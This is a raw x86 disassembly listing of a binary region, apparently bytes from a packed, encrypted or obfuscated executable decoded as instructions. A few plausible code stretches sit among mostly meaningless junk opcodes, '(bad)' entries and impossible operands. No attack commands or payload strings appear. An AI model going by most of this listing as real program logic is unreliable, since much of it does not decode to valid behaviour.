  402059:	arpl   WORD PTR [ebx],bx
  40205b:	call   DWORD PTR ds:0xd8985e80
  402061:	inc    ecx
  402062:	into   
  402063:	stos   DWORD PTR es:[edi],eax
  402064:	(bad)  
  402066:	add    ebx,esp
  402068:	fwait
  402069:	cmp    bh,BYTE PTR [edi+esi*8]
  40206c:	cli    
  40206d:	sub    BYTE PTR [edx+0x558b7629],ah
  402073:	loopne 0x40203c
  402075:	inc    ebp
  402076:	aam    0xb9
  402078:	dec    esi
  402079:	add    BYTE PTR [eax],al
  40207b:	mov    DWORD PTR ds:0x42ee24,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e75a,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e762,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi-0x28dd6c50],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x402123
  4020cf:	out    dx,eax
  4020d0:	or     bh,ah
  4020d2:	sub    cl,BYTE PTR [ebx+esi*8]
  4020d5:	dec    ebx
  4020d6:	sub    bh,cl
  4020d8:	sub    al,0x8d
  4020da:	add    BYTE PTR [ecx+esi*8+0x65],0x77
  4020df:	ja     0x4020b8
  4020e1:	daa    
  4020e2:	push   ebp
  4020e3:	aaa    
  4020e4:	xchg   esp,eax
  4020e5:	fcmovnbe st,st(1)
  4020e7:	ret    0x1f46
  4020ea:	mov    ecx,0xbcec4f3a
  4020ef:	add    DWORD PTR [esi-0x71],ecx
  4020f2:	mov    ah,0xdc
  4020f4:	bnd jns 0x4020f7
  4020f7:	inc    edi
  4020f8:	ins    DWORD PTR es:[edi],dx
  4020f9:	cmp    cl,BYTE PTR [edi+0x66]
  4020fc:	xchg   edi,eax
  4020fd:	outs   dx,BYTE PTR ds:[esi]
  4020fe:	mov    ecx,0x8072e7fc
  402103:	inc    eax
  402104:	or     eax,DWORD PTR [edi+ecx*4-0x15fffc1b]
  40210b:	add    eax,0xb0268e85
  402110:	(bad)  
  402111:	retf   
  402112:	dec    ecx
  402113:	or     al,0x4c
  402115:	mov    ebx,0x82fbb38b
  40211a:	idiv   DWORD PTR [esi+0x62]
  40211d:	sar    BYTE PTR [edx-0x3bf3ad80],1
  402123:	mov    WORD PTR [edi+0x65],gs
  402126:	add    esi,ecx
  402128:	mov    ?,WORD PTR [edx+edi*2]
  40212b:	jne    0x4020e9
  40212d:	inc    esp
  40212e:	test   BYTE PTR [esi+0x45],al
  402131:	(bad)  
  402132:	test   eax,0x5844fcbd
  402137:	test   al,0x84
  402139:	dec    esi
  40213a:	test   eax,0x3272657e
  40213f:	cmp    al,0x10
  402141:	xor    ecx,esi
  402143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402144:	fistp  DWORD PTR ss:[esi+edi*8+0x76]
  402149:	loope  0x4020f3
  40214b:	dec    ebx
  40214c:	or     bh,BYTE PTR [ebp+esi*2+0x1a0426]
  402153:	push   ebp
  402154:	call   ebp
  402156:	repnz in al,0x37
  402159:	add    BYTE PTR [esi],dh
  40215b:	push   edx
  40215c:	repnz sub ch,dl
  40215f:	add    DWORD PTR [ecx],ecx
  402161:	push   0x1b
  402163:	inc    DWORD PTR [edx-0x5]
  402166:	jae    0x4021c8
  402168:	pop    ss
  402169:	mov    al,ds:0x71a79c26
  40216e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40216f:	xchg   edx,eax
  402170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402171:	call   0xd886:0x2999041d
  402178:	rol    DWORD PTR [eax],cl
  40217a:	mov    esp,DWORD PTR [eax-0x6]
  40217d:	sub    eax,0x7fe08859
  402182:	mov    eax,0x4caf4f78
  402187:	and    DWORD PTR [ebp+0x493ed3ad],ecx
  40218d:	add    DWORD PTR ds:0xe26f1ffd,edx
  402193:	out    0x28,eax
  402195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402196:	jl     0x40211f
  402198:	outs   dx,BYTE PTR ds:[esi]
  402199:	or     BYTE PTR [eax+0x74ce9a89],0xdc
  4021a0:	mov    esp,0x6d66d5ce
  4021a5:	cmp    eax,0xeb87f14e
  4021aa:	in     al,0x22
  4021ac:	fcomp  QWORD PTR [edx]
  4021ae:	clc    
  4021af:	retf   
  4021b0:	inc    esi
  4021b1:	inc    esi
  4021b2:	dec    ebp
  4021b3:	push   ecx
  4021b4:	mov    eax,ds:0x4c69b5a2
  4021b9:	ss and dh,dl
  4021bc:	int3   
  4021bd:	pop    es
  4021be:	adc    BYTE PTR [ebx+0x9],ch
  4021c1:	xor    DWORD PTR [edx+0xd],eax
  4021c4:	cwde   
  4021c5:	sub    BYTE PTR [bx+si],ah
  4021c8:	jg     0x40217a
  4021ca:	and    esi,DWORD PTR [edi]
  4021cc:	jae    0x402160
  4021ce:	xchg   ecx,eax
  4021cf:	gs leave 
  4021d1:	sub    eax,0x5b4b465c
  4021d6:	inc    esi
  4021d7:	vpackuswb xmm1,xmm0,xmm2
  4021db:	sub    DWORD PTR [esp+edi*1],esi
  4021de:	out    dx,eax
  4021df:	out    0xa0,eax
  4021e1:	or     ecx,ebp
  4021e3:	loop   0x4021ce
  4021e5:	dec    ebx
  4021e6:	out    dx,eax
  4021e7:	mov    ch,0xa1
  4021e9:	push   ds
  4021ea:	mov    al,ds:0x6d381507
  4021ef:	mov    al,0xa6
  4021f1:	pop    ds
  4021f2:	xor    DWORD PTR [edx+0x7e0c6761],0xfffffff9
  4021f9:	lea    ebx,[edx+0x45]
  4021fc:	jge    0x40227a
  4021fe:	pop    ebp
  4021ff:	test   eax,0xb7149cf0
  402204:	sar    DWORD PTR [ebx],0x4e
  402207:	into   
  402208:	push   cs
  402209:	nop
  40220a:	bnd jnp 0x40227b
  40220d:	sar    edi,1
  40220f:	test   DWORD PTR [ecx+0x5b3c48ab],0x4aaca85b
  402219:	mov    WORD PTR [eax+0x16],?
  40221c:	add    al,0xa9
  40221e:	out    dx,eax
  40221f:	and    al,dh
  402221:	sub    ah,BYTE PTR ds:0xc556ed5b
  402227:	das    
  402228:	jbe    0x40224e
  40222a:	mov    WORD PTR [edx+edi*1+0x39],fs
  40222e:	mov    dh,0x4
  402230:	lds    eax,FWORD PTR [ecx-0x68]
  402233:	inc    esi
  402234:	dec    edx
  402235:	or     al,0x80
  402237:	xchg   cl,bh
  402239:	jg     0x402231
  40223b:	(bad)  
  40223d:	mov    ds:0x6e6d1b4f,eax
  402242:	cmp    dl,BYTE PTR [edx-0x13]
  402245:	jmp    DWORD PTR [eax+0x6]
  402248:	in     eax,0x4
  40224a:	es jmp 0x402299
  40224d:	fwait
  40224e:	in     eax,0xa
  402250:	addr16 aad 0x85
  402253:	mov    esp,0xebdd47fa
  402258:	rcr    BYTE PTR [edi],0xe9
  40225b:	push   eax
  40225c:	daa    
  40225d:	in     al,0xad
  40225f:	leave  
  402260:	ds pop ecx
  402262:	mov    DWORD PTR [edx+edx*8],esp
  402265:	sbb    BYTE PTR [ebp+0x7014c3c],ch
  40226b:	mov    es,WORD PTR [edx-0x33113e2c]
  402271:	inc    eax
  402272:	adc    BYTE PTR [edi],cl
  402274:	xchg   ebx,eax
  402275:	or     BYTE PTR [eax],ah
  402277:	stos   BYTE PTR es:[edi],al
  402278:	mov    al,0xa0
  40227a:	pop    ecx
  40227b:	mov    bh,0x9b
  40227d:	fwait
  40227e:	xlat   BYTE PTR ds:[ebx]
  40227f:	jmp    0x402235
  402281:	les    esp,FWORD PTR [edi-0x59]
  402284:	cli    
  402285:	cmp    al,0xcf
  402287:	mov    dh,0x6
  402289:	dec    ebx
  40228a:	retf   0xe46e
  40228d:	jns    0x402303
  40228f:	sub    ch,BYTE PTR ds:0xa0ceef31
  402295:	imul   ebx,DWORD PTR [ebx+0x52],0x60df8f64
  40229c:	push   es
  40229d:	call   0xe012:0x3328cfa
  4022a4:	cmp    al,0x88
  4022a6:	mov    ah,0x8f
  4022a8:	jo     0x402254
  4022aa:	push   ds
  4022ab:	dec    ebx
  4022ac:	(bad)  
  4022ad:	adc    dl,BYTE PTR [ecx+0x1c615752]
  4022b3:	sbb    al,0xaa
  4022b5:	(bad)  
  4022b6:	icebp  
  4022b7:	shr    DWORD PTR [esi-0x11],cl
  4022ba:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4022bc:	and    bl,dh
  4022be:	sti    
  4022bf:	and    dl,BYTE PTR [edi+edx*4-0x67]
  4022c3:	icebp  
  4022c4:	xchg   ecx,eax
  4022c5:	ret    0xf5ab
  4022c8:	ja     0x4022ed
  4022ca:	int    0x85
  4022cc:	pop    esp
  4022cd:	or     bl,BYTE PTR [esi+0x24]
  4022d0:	mov    dh,0xc3
  4022d2:	mov    ecx,0x3bcbf892
  4022d7:	push   es
  4022d8:	or     cl,bh
  4022da:	dec    esp
  4022db:	imul   BYTE PTR [esi+0xebbf8aa]
  4022e1:	xchg   esp,eax
  4022e2:	pusha  
  4022e3:	ja     0x40229a
  4022e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022e6:	gs inc edx
  4022e8:	or     al,0x36
  4022ea:	mov    cl,0xa2
  4022ec:	jmp    0x179d:0x137b8163
  4022f3:	sbb    edx,DWORD PTR [edi-0x29]
  4022f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022f7:	sbb    al,0x40
  4022f9:	add    eax,esi
  4022fb:	or     BYTE PTR [eax+0x5d],ch
  4022fe:	xlat   BYTE PTR ds:[ebx]
  4022ff:	xor    BYTE PTR fs:[ebp+esi*8-0x489fb519],bh
  402307:	fnsave [ebx]
  402309:	pop    ss
  40230a:	shl    BYTE PTR [esi+0x23],0x34
  40230e:	inc    esp
  40230f:	fcom   DWORD PTR [eax+ecx*1]
  402312:	sub    ecx,DWORD PTR [edx]
  402314:	pop    eax
  402315:	outs   dx,DWORD PTR ds:[esi]
  402316:	adc    ecx,DWORD PTR [esi+0x45]
  402319:	pop    esp
  40231a:	stos   BYTE PTR es:[edi],al
  40231b:	mov    esp,0xbe61eed5
  402320:	mov    bh,0x5a
  402322:	or     esp,DWORD PTR fs:[edi+0x1cd3f0cf]
  402329:	test   BYTE PTR [eax+eiz*8],dl
  40232c:	add    al,0xdd
  40232e:	pop    ss
  40232f:	cmp    ah,al
  402331:	mov    ds:0xf77d800,al
  402336:	arpl   WORD PTR [ecx+0x281e4c6d],di
  40233c:	lahf   
  40233d:	pop    ebp
  40233e:	add    DWORD PTR [edi],ecx
  402340:	cmp    al,0x30
  402342:	fild   WORD PTR [ebx+0x62f33ded]
  402348:	pop    es
  402349:	mov    edi,0xfc07a54
  40234e:	mov    ch,0x82
  402350:	jp     0x40234b
  402352:	ins    DWORD PTR es:[edi],dx
  402353:	daa    
  402354:	std    
  402355:	jg     0x40235a
  402357:	addr16 pushf 
  402359:	and    bl,dl
  40235b:	jp     0x40239b
  40235d:	ins    DWORD PTR es:[edi],dx
  40235e:	add    eax,0x482f473
  402363:	cdq    
  402364:	clc    
  402365:	(bad)  
  402366:	addr16 mov ds:0x51b3,eax
  40236a:	iret   
  40236b:	xor    eax,0x168efbc
  402370:	mov    ch,0x3e
  402372:	fld    DWORD PTR [edi]
  402374:	adc    dl,bh
  402376:	mov    BYTE PTR [esi+0x31],cl
  402379:	jecxz  0x402313
  40237b:	dec    esp
  40237c:	cmc    
  40237d:	or     al,0x6b
  40237f:	push   0xffffffe9
  402381:	outs   dx,DWORD PTR ds:[esi]
  402382:	jp     0x402336
  402384:	cwde   
  402385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402386:	stos   BYTE PTR es:[edi],al
  402387:	pop    esp
  402388:	test   BYTE PTR [eax],0x44
  40238b:	add    BYTE PTR [ebp+0x55],0xf2
  40238f:	data16 cmp al,0xf0
  402392:	adc    dh,BYTE PTR [ebp-0xdf70904]
  402398:	push   esp
  402399:	inc    esp
  40239a:	retf   0x8537
  40239d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40239e:	mov    dh,0x52
  4023a0:	or     edx,DWORD PTR [edx+eax*2+0x13]
  4023a4:	xchg   ebx,eax
  4023a5:	in     al,0xfc
  4023a7:	adc    eax,0x78b10e14
  4023ac:	mov    ebx,esp
  4023ae:	cmp    al,0x2b
  4023b0:	xlat   BYTE PTR ds:[ebx]
  4023b1:	stc    
  4023b2:	enter  0x5d64,0xf5
  4023b6:	(bad)  
  4023b8:	test   al,0xc0
  4023ba:	xchg   ecx,eax
  4023bb:	mov    dh,0xee
  4023bd:	loop   0x4023bd
  4023bf:	pushf  
  4023c0:	cwde   
  4023c1:	test   esi,esp
  4023c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023c5:	inc    esp
  4023c6:	push   es
  4023c7:	pop    ds
  4023c8:	in     al,dx
  4023c9:	mov    ds:0x194d93f5,al
  4023ce:	(bad)  
  4023cf:	fdivr  QWORD PTR [esi-0x1a]
  4023d2:	ret    
  4023d3:	jmp    0x513d:0xc9234ad8
  4023da:	push   cs
  4023db:	mov    ch,0x6a
  4023dd:	or     DWORD PTR [edi+0x37],0xffffff81
  4023e1:	(bad)
  4023e4:	rcl    DWORD PTR [eax+0x4422538a],0x9d
  4023eb:	pop    ebx
  4023ec:	lods   al,BYTE PTR ds:[esi]
  4023ed:	packssdw mm4,QWORD PTR [esi]
  4023f0:	das    
  4023f1:	push   esi
  4023f2:	retf   0xe805
  4023f5:	or     DWORD PTR ds:0xbd6beab3,edi
  4023fb:	inc    edi
  4023fc:	mov    ds:0x5e0d93a2,al
  402401:	xchg   esi,eax
  402402:	int3   
  402403:	ret    0xe5ab
  402406:	dec    edi
  402407:	sub    eax,0x969939d7
  40240c:	lock xor eax,0xee210087
  402412:	mov    esi,0x7dba306e
  402417:	push   es
  402418:	jmp    0x4023a0
  40241a:	lahf   
  40241b:	push   0xc5238abc
  402420:	cwde   
  402421:	dec    ebp
  402422:	push   0x4d700ebb
  402427:	hlt    
  402428:	dec    ebp
  402429:	js     0x4023d5
  40242b:	pop    ss
  40242c:	popa   
  40242d:	lahf   
  40242e:	sub    edx,DWORD PTR [edi]
  402430:	test   al,0xf6
  402432:	jne    0x40241d
  402434:	inc    esi
  402435:	cmp    dh,ah
  402437:	ds test edi,edx
  40243a:	das    
  40243b:	xchg   ecx,eax
  40243c:	ret    
  40243d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40243e:	xor    DWORD PTR [ebx-0x1c],0x21
  402442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402443:	in     al,0xb1
  402445:	arpl   WORD PTR [ebp-0x5a207037],ax
  40244b:	mov    edx,?
  40244d:	sbb    bh,dl
  40244f:	jp     0x402407
  402451:	jmp    0x4024bd
  402453:	stos   DWORD PTR es:[edi],eax
  402454:	adc    edx,DWORD PTR [esi-0x34]
  402457:	repz stc 
  402459:	cmp    esi,DWORD PTR [eax+ebp*4-0x7d9e57c7]
  402460:	ins    DWORD PTR es:[edi],dx
  402461:	xchg   BYTE PTR [ebx-0x112d96f0],cl
  402467:	test   eax,0x5c7f89e
  40246c:	inc    esi
  40246d:	add    eax,0x79640043
  402472:	add    BYTE PTR [eax],al
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x4304be,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x4304ba,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	clc    
  4024b3:	jg     0x40248c
  4024b5:	or     edx,DWORD PTR [edx+0xf]
  4024b8:	jle    0x402538
  4024ba:	xor    BYTE PTR [ecx+0x7e],0x7e
  4024be:	stc    
  4024bf:	test   eax,0xbe5b001
  4024c4:	or     BYTE PTR [ecx],ch
  4024c6:	loope  0x4024bb
  4024c8:	lock out dx,al
  4024ca:	pop    ebx
  4024cb:	lods   al,BYTE PTR ds:[esi]
  4024cc:	cmp    al,0xf4
  4024ce:	dec    ebp
  4024cf:	cld    
  4024d0:	xor    al,ch
  4024d2:	or     al,0xd1
  4024d4:	shr    esi,1
  4024d6:	mov    ah,0x45
  4024d8:	(bad)  
  4024d9:	sar    DWORD PTR [ebx+0x3ad6e477],1
  4024df:	cwde   
  4024e0:	fucomi st,st(6)
  4024e2:	addr16 push edx
  4024e4:	mov    esi,0x6211a483
  4024e9:	jb     0x4024dd
  4024eb:	add    BYTE PTR [ebx+0x5c0f7a69],0xf4
  4024f2:	test   dh,bl
  4024f4:	mov    eax,ds:0xcf647ba6
  4024f9:	fst    st(0)
  4024fb:	xor    dl,bh
  4024fd:	push   0x42c62480
  402502:	xchg   ebp,eax
  402503:	sbb    ah,BYTE PTR [edx+eax*4-0x6dfb97]
  40250a:	xor    eax,0xccb2b0f
  40250f:	and    BYTE PTR ds:0xc52480a6,dl
  402515:	lods   al,BYTE PTR ds:[esi]
  402516:	push   ebx
  402517:	or     eax,0xe60460bf
  40251c:	sbb    DWORD PTR [ebx-0x26732031],ebx
  402522:	out    0x29,eax
  402524:	fdivr  DWORD PTR [ebx+esi*2+0x58]
  402528:	sti    
  402529:	or     al,0x97
  40252b:	dec    edi
  40252c:	ffree  st(2)
  40252e:	sub    DWORD PTR [ebx-0x3b68c795],eax
  402534:	pop    ds
  402535:	or     al,0xec
  402537:	les    edx,FWORD PTR [ebp+0x3b]
  40253a:	and    DWORD PTR [ebp+0x50],ecx
  40253d:	mov    ?,edx
  40253f:	dec    ebx
  402540:	sub    al,0x2a
  402542:	repz in al,dx
  402544:	sbb    ebp,DWORD PTR [edi]
  402546:	in     eax,0xf2
  402548:	jle    0x402577
  40254a:	jne    0x402566
  40254c:	idiv   BYTE PTR [eax+0x1568956e]
  402552:	aam    0xc9
  402554:	jge    0x402536
  402556:	jl     0x4024f2
  402558:	das    
  402559:	out    0x39,eax
  40255b:	cmp    cl,BYTE PTR [eax]
  40255d:	mov    eax,0x631e1c47
  402562:	xor    DWORD PTR [edx+ebx*1+0xb],ecx
  402566:	ins    DWORD PTR es:[edi],dx
  402567:	shr    DWORD PTR [esi+ebp*1],0x95
  40256b:	pop    es
  40256c:	mov    BYTE PTR cs:0xcfd7aa61,dh
  402573:	in     eax,dx
  402574:	in     eax,dx
  402575:	sub    al,0xd9
  402577:	inc    ecx
  402578:	int3   
  402579:	lods   al,BYTE PTR ds:[esi]
  40257a:	pop    es
  40257b:	hlt    
  40257c:	mov    esi,0x6108657b
  402581:	test   BYTE PTR [ecx+0x37],bh
  402584:	rol    eax,cl
  402586:	stc    
  402587:	mov    ah,0xf7
  402589:	popf   
  40258a:	push   0xd529dcaf
  40258f:	mov    ds:0x44ca2e86,al
  402594:	xor    al,BYTE PTR [edi]
  402596:	(bad)  
  402597:	dec    esi
  402598:	push   cs
  402599:	popf   
  40259a:	mov    ch,0x31
  40259c:	cmp    DWORD PTR [esi],ebp
  40259e:	stos   DWORD PTR es:[edi],eax
  40259f:	xor    ch,ah
  4025a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a2:	nop
  4025a3:	push   esp
  4025a4:	jl     0x4025e5
  4025a6:	mov    eax,0xcb4027ba
  4025ab:	sub    BYTE PTR [ecx+0x4b39f3ce],bh
  4025b1:	rcl    ebx,0xdf
  4025b4:	fs ror cl,cl
  4025b7:	pop    edx
  4025b8:	cld    
  4025b9:	cld    
  4025ba:	(bad)  
  4025bb:	aad    0x2b
  4025bd:	ret    0x2e3b
  4025c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025c1:	add    bh,bl
  4025c3:	sbb    bh,BYTE PTR [edx]
  4025c5:	lea    eax,[ebx]
  4025c7:	dec    edi
  4025c8:	(bad)  
  4025c9:	pop    ebx
  4025ca:	inc    esi
  4025cb:	xchg   edx,eax
  4025cc:	push   es
  4025cd:	adc    BYTE PTR [ebx-0x1b],0xd3
  4025d1:	ins    DWORD PTR es:[edi],dx
  4025d2:	inc    ebp
  4025d3:	test   eax,0x93a1f3a
  4025d8:	cld    
  4025d9:	lods   al,BYTE PTR ds:[esi]
  4025da:	imul   esp,DWORD PTR [ecx],0x80ceda22
  4025e0:	jmp    0x1171:0x74038a2
  4025e7:	jb     0x4025b4
  4025e9:	retf   
  4025ea:	(bad)  [ebx+ebx*1+0x47]
  4025ee:	shl    BYTE PTR [ebp-0x71],1
  4025f1:	loope  0x4025c6
  4025f3:	inc    esi
  4025f4:	fist   WORD PTR [edi]
  4025f6:	dec    esi
  4025f7:	stos   DWORD PTR es:[edi],eax
  4025f8:	jb     0x40260b
  4025fa:	adc    bl,BYTE PTR [ebp+0x78]
  4025fd:	xlat   BYTE PTR ds:[ebx]
  4025fe:	pop    esi
  4025ff:	sar    BYTE PTR [ecx-0x71],cl
  402602:	mov    bl,0x5d
  402604:	or     eax,0x97f6c36f
  402609:	(bad)  
  40260a:	fwait
  40260b:	xor    eax,0x9f8c4e0d
  402610:	add    ebp,DWORD PTR [eax+0x64]
  402613:	add    BYTE PTR [edi+ebx*8+0x5b],bl
  402617:	sbb    cl,BYTE PTR [eax+ebp*4]
  40261a:	xor    esp,DWORD PTR [edx-0x6f]
  40261d:	int3   
  40261e:	(bad)  
  40261f:	push   ss
  402620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402621:	or     al,0x86
  402623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402624:	lahf   
  402625:	xchg   BYTE PTR [ebx-0x241b69ad],dl
  40262b:	xor    dh,BYTE PTR ds:0xc08b40bb
  402631:	and    edi,ebx
  402633:	adc    al,0xb4
  402635:	arpl   WORD PTR [esi],di
  402637:	mov    edi,DWORD PTR [ebx+0x7517b835]
  40263d:	pop    eax
  40263e:	sti    
  40263f:	and    edi,esi
  402641:	mov    eax,0x59d30a21
  402646:	cdq    
  402647:	bound  ebp,QWORD PTR [edi+0x6742581d]
  40264d:	das    
  40264e:	(bad)  
  40264f:	or     edi,DWORD PTR [ecx+0x47]
  402652:	int3   
  402653:	cmp    esp,DWORD PTR [edi-0x1e]
  402656:	push   esp
  402657:	dec    ebx
  402658:	call   0x1a8dd16
  40265d:	dec    ecx
  40265e:	sbb    al,0x78
  402660:	pcmpeqw mm3,QWORD PTR [eax-0x5c6b16d]
  402667:	add    al,0x51
  402669:	fiadd  DWORD PTR [esi+0x6d62808d]
  40266f:	repz bound esi,QWORD PTR ss:[ecx]
  402673:	pop    ss
  402674:	adc    BYTE PTR [ebx],0xd7
  402677:	leave  
  402678:	aas    
  402679:	mov    ebp,0x54da2dd1
  40267e:	dec    edi
  40267f:	xchg   ebx,eax
  402681:	push   edi
  402682:	das    
  402683:	dec    edi
  402684:	sbb    DWORD PTR [ebp+edi*4+0xbeb83e3],edx
  40268b:	shl    BYTE PTR [edx],0x88
  40268e:	gs adc ch,dl
  402691:	push   es
  402692:	sbb    eax,0x8cc3e01a
  402697:	daa    
  402698:	add    al,0x42
  40269a:	pop    ds
  40269b:	dec    esi
  40269c:	jecxz  0x40264d
  40269e:	outs   dx,BYTE PTR ds:[esi]
  40269f:	push   ds
  4026a0:	std    
  4026a1:	xor    al,0xce
  4026a3:	xor    eax,0x40555c1f
  4026a8:	scas   al,BYTE PTR es:[edi]
  4026a9:	jg     0x402701
  4026ab:	ins    BYTE PTR es:[edi],dx
  4026ac:	cmp    edi,DWORD PTR [ebp-0x312b8a4]
  4026b2:	repnz mov ah,0xa0
  4026b5:	pop    esp
  4026b6:	sbb    edi,eax
  4026b8:	loop   0x402718
  4026ba:	arpl   WORD PTR [ebx+0x118418c3],di
  4026c0:	(bad)  
  4026c1:	popa   
  4026c2:	les    eax,FWORD PTR [esi]
  4026c4:	imul   ebx,DWORD PTR [ecx+eax*4-0x69dc481f],0x36
  4026cc:	(bad)  
  4026cd:	popa   
  4026ce:	pop    ecx
  4026cf:	lods   eax,DWORD PTR ds:[esi]
  4026d0:	test   eax,0xe6018f4e
  4026d5:	arpl   WORD PTR [ecx+0x3328c02e],si
  4026db:	xor    DWORD PTR [edx],esi
  4026dd:	sbb    dl,bl
  4026df:	fstp   st(4)
  4026e1:	rol    BYTE PTR [esi],1
  4026e3:	and    DWORD PTR [ebx],ebp
  4026e5:	popa   
  4026e6:	xchg   ecx,eax
  4026e7:	sbb    DWORD PTR [edx+edx*8],0xffffffc8
  4026eb:	dec    esp
  4026ec:	mov    esi,0xfb1074d2
  4026f1:	mov    es,WORD PTR [eax]
  4026f3:	sub    al,0xa7
  4026f5:	or     eax,0x939c34cf
  4026fa:	popf   
  4026fb:	xchg   ebx,eax
  4026fc:	loop   0x402724
  4026fe:	cmp    BYTE PTR [ebx+0x11],bh
  402701:	adc    BYTE PTR [ebx+eax*8+0x56],0x68
  402706:	lods   eax,DWORD PTR ds:[esi]
  402707:	and    esi,ebp
  402709:	hlt    
  40270a:	adc    ecx,0x940b976f
  402710:	sbb    al,BYTE PTR [ebp-0x4f4e3f61]
  402716:	mov    ch,0x11
  402718:	into   
  402719:	das    
  40271a:	bound  ebp,QWORD PTR [edx+eiz*4+0x8]
  40271e:	lea    ecx,[ebx+ecx*8+0x267cb8d2]
  402725:	xchg   esi,eax
  402726:	stos   DWORD PTR es:[edi],eax
  402727:	pop    ds
  402728:	pop    edx
  402729:	sar    DWORD PTR [ebx-0x2256c2d9],1
  40272f:	and    dl,BYTE PTR [edx+ebp*2]
  402732:	inc    eax
  402733:	xchg   esp,eax
  402734:	inc    esp
  402735:	adc    eax,0x60265dbc
  40273a:	adc    cl,BYTE PTR [edx-0x73b9d11b]
  402740:	in     al,dx
  402741:	mov    ch,ch
  402743:	inc    edi
  402744:	cmp    DWORD PTR [ebp-0x41d59b6e],ecx
  40274a:	lods   al,BYTE PTR ds:[esi]
  40274b:	sub    al,0x79
  40274d:	push   ecx
  40274e:	pop    ds
  40274f:	fistp  DWORD PTR [edx]
  402751:	imul   BYTE PTR [edi]
  402753:	xor    DWORD PTR [ecx],edx
  402755:	adc    DWORD PTR [ebp+0x740565e2],edx
  40275b:	mov    dl,0xf4
  40275d:	or     BYTE PTR [bx+si],ah
  402760:	xchg   esi,eax
  402761:	add    DWORD PTR [esi-0x17],esi
  402764:	mov    dh,0xa8
  402766:	jbe    0x4026ef
  402768:	fwait
  402769:	mov    WORD PTR [edx+eiz*8],es
  40276c:	fild   QWORD PTR [ebx-0x17]
  40276f:	js     0x4027c1
  402771:	call   0xd25ec0a0
  402776:	shr    BYTE PTR [ebp+0x3c7a01a3],1
  40277c:	shl    bh,cl
  40277e:	and    eax,0xf265a188
  402783:	div    ah
  402785:	push   edi
  402786:	test   esi,0xda2121b9
  40278c:	push   ebp
  40278d:	mov    dl,0xda
  40278f:	jl     0x40274f
  402791:	aas    
  402792:	in     al,dx
  402793:	inc    ebp
  402794:	mov    cl,0x35
  402796:	cmp    edx,DWORD PTR [edi+0x16]
  402799:	add    BYTE PTR [edi-0x12027098],0x1e
  4027a0:	pushf  
  4027a1:	psubsw mm4,QWORD PTR [ecx+esi*2-0x3b194160]
  4027a9:	mov    esi,0x27b1fbd4
  4027ae:	pop    ss
  4027af:	fimul  DWORD PTR [edx+0x77]
  4027b2:	xchg   ecx,eax
  4027b3:	cmc    
  4027b4:	inc    ecx
  4027b5:	pop    eax
  4027b6:	dec    esi
  4027b7:	mov    es,WORD PTR [edx+0x54]
  4027ba:	adc    bl,BYTE PTR [ebp-0x65]
  4027bd:	pop    esp
  4027be:	aam    0xb7
  4027c0:	mov    BYTE PTR [ebp+esi*4-0x5bf9bd50],ch
  4027c7:	or     BYTE PTR [eax+esi*8-0x5],cl
  4027cb:	sub    al,BYTE PTR [ecx+0x2ab52b5e]
  4027d1:	inc    ebx
  4027d2:	pop    edi
  4027d3:	sbb    DWORD PTR es:[ebx],esi
  4027d6:	sub    al,0xfa
  4027d8:	loopne 0x4027f6
  4027da:	fidiv  DWORD PTR [ebp-0x5f]
  4027dd:	pop    es
  4027de:	iret   
  4027df:	inc    edi
  4027e0:	jl     0x4027fb
  4027e2:	lods   al,BYTE PTR ds:[esi]
  4027e3:	rcl    BYTE PTR [ebx],1
  4027e5:	stc    
  4027e6:	sub    al,BYTE PTR [ecx]
  4027e8:	mov    ah,0x2c
  4027ea:	xor    dl,bl
  4027ec:	lock adc edx,edx
  4027ef:	leave  
  4027f0:	call   ebx
  4027f2:	(bad)  
  4027f4:	aas    
  4027f5:	xor    BYTE PTR [edx-0x80],0xd7
  4027f9:	add    al,0xee
  4027fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027fc:	and    ch,BYTE PTR [esi+esi*2-0x30]
  402800:	add    al,0xa0
  402802:	(bad)  
  402803:	aam    0xae
  402805:	jl     0x402790
  402807:	mov    esi,DWORD PTR [edx-0x4cd9fbe]
  40280d:	dec    ebx
  40280e:	xor    DWORD PTR [edx-0x1b],edi
  402811:	test   DWORD PTR [ecx],esi
